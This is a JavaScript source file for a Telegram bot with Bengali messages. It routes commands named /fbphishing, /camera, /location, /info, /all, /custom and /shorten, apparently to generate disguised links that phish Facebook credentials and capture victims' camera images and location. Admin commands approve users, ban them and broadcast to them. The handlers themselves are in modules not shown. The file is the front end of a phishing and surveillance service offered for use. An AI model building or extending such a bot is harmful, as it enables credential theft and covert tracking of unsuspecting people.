const TelegramBot = require('node-telegram-bot-api');
const database = require('../utils/database');
const logger = require('../utils/logger');
const helpers = require('../utils/helpers');
const constants = require('../utils/constants');
const authMiddleware = require('../middleware/authMiddleware');
const rateLimiter = require('../middleware/rateLimiter');
const userCommands = require('./commands/userCommands');
const adminCommands = require('./commands/adminCommands');

class Bot {
    constructor() {
        this.token = process.env.BOT_TOKEN;
        this.bot = null;
        this.admins = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : [];
    }

    startBot() {
        try {
            this.bot = new TelegramBot(this.token, { polling: true });
            console.log('🤖 Bot polling started');
            
            this.setupMiddleware();
            this.setupCommands();
            this.setupCallbacks();
            this.setupErrorHandler();
            
        } catch (error) {
            console.error('Bot start error:', error);
        }
    }

    setupMiddleware() {
        // Global middleware for all messages
        this.bot.on('message', async (msg) => {
            try {
                const userId = msg.from.id;
                const chatId = msg.chat.id;
                
                // Skip if no text (like stickers, photos)
                if (!msg.text) return;
                
                // Check if user is banned
                const isBanned = await authMiddleware.checkBan(userId);
                if (isBanned && msg.text !== '/start') {
                    return this.bot.sendMessage(chatId, constants.MESSAGES.BANNED);
                }
                
                // Rate limiting
                if (!await rateLimiter.checkLimit(userId)) {
                    return this.bot.sendMessage(chatId, constants.MESSAGES.RATE_LIMIT);
                }
                
                // Log activity
                await logger.logActivity(userId, 'message', { text: msg.text });
                
            } catch (error) {
                console.error('Middleware error:', error);
            }
        });
    }

    setupCommands() {
        // User Commands
        this.bot.onText(/\/start/, async (msg) => {
            await userCommands.start(this.bot, msg);
        });

        this.bot.onText(/\/fbphishing/, async (msg) => {
            await userCommands.fbPhishing(this.bot, msg);
        });

        this.bot.onText(/\/camera/, async (msg) => {
            await userCommands.camera(this.bot, msg);
        });

        this.bot.onText(/\/location/, async (msg) => {
            await userCommands.location(this.bot, msg);
        });

        this.bot.onText(/\/info/, async (msg) => {
            await userCommands.info(this.bot, msg);
        });

        this.bot.onText(/\/all/, async (msg) => {
            await userCommands.allInOne(this.bot, msg);
        });

        this.bot.onText(/\/custom (.+)/, async (msg, match) => {
            await userCommands.custom(this.bot, msg, match);
        });

        this.bot.onText(/\/shorten (.+)/, async (msg, match) => {
            await userCommands.shorten(this.bot, msg, match);
        });

        this.bot.onText(/\/mylinks(?:\s+(.+))?/, async (msg, match) => {
            await userCommands.myLinks(this.bot, msg, match);
        });

        this.bot.onText(/\/help/, async (msg) => {
            await userCommands.help(this.bot, msg);
        });

        // Admin Commands
        this.bot.onText(/\/users(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.users(this.bot, msg, match);
        });

        this.bot.onText(/\/userinfo(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.userInfo(this.bot, msg, match);
        });

        this.bot.onText(/\/approve(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.approve(this.bot, msg, match);
        });

        this.bot.onText(/\/reject(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.reject(this.bot, msg, match);
        });

        this.bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.ban(this.bot, msg, match);
        });

        this.bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.unban(this.bot, msg, match);
        });

        this.bot.onText(/\/pending(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.pending(this.bot, msg, match);
        });

        this.bot.onText(/\/broadcast (.+)/, async (msg, match) => {
            await adminCommands.broadcast(this.bot, msg, match);
        });

        this.bot.onText(/\/stats/, async (msg) => {
            await adminCommands.stats(this.bot, msg);
        });

        this.bot.onText(/\/logs(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.logs(this.bot, msg, match);
        });

        this.bot.onText(/\/clearlogs(?:\s+(.+))?/, async (msg, match) => {
            await adminCommands.clearLogs(this.bot, msg, match);
        });

        this.bot.onText(/\/backup/, async (msg) => {
            await adminCommands.backup(this.bot, msg);
        });
    }

    setupCallbacks() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', async (callbackQuery) => {
            const msg = callbackQuery.message;
            const data = callbackQuery.data;
            const userId = callbackQuery.from.id;

            try {
                // Check admin for admin callbacks
                if (data.startsWith('admin_') && !this.admins.includes(userId.toString())) {
                    return this.bot.answerCallbackQuery(callbackQuery.id, {
                        text: '⛔ অনুমতি নেই!',
                        show_alert: true
                    });
                }

                // Parse callback data
                const [action, targetId, type] = data.split('_');

                switch (action) {
                    case 'approve':
                        await adminCommands.handleApproveCallback(this.bot, callbackQuery, targetId);
                        break;
                    case 'reject':
                        await adminCommands.handleRejectCallback(this.bot, callbackQuery, targetId);
                        break;
                    case 'ban':
                        await adminCommands.handleBanCallback(this.bot, callbackQuery, targetId);
                        break;
                    case 'unban':
                        await adminCommands.handleUnbanCallback(this.bot, callbackQuery, targetId);
                        break;
                    case 'refresh':
                        await adminCommands.handleRefreshCallback(this.bot, callbackQuery, targetId);
                        break;
                    default:
                        await this.bot.answerCallbackQuery(callbackQuery.id, {
                            text: 'অজানা কমান্ড!',
                            show_alert: true
                        });
                }
            } catch (error) {
                console.error('Callback error:', error);
                await this.bot.answerCallbackQuery(callbackQuery.id, {
                    text: 'একটি ত্রুটি হয়েছে!',
                    show_alert: true
                });
            }
        });
    }

    setupErrorHandler() {
        this.bot.on('polling_error', (error) => {
            console.error('Polling error:', error);
        });

        process.on('unhandledRejection', (error) => {
            console.error('Unhandled rejection:', error);
        });
    }

    // Helper method to check if user is admin
    isAdmin(userId) {
        return this.admins.includes(userId.toString());
    }
}

module.exports = new Bot();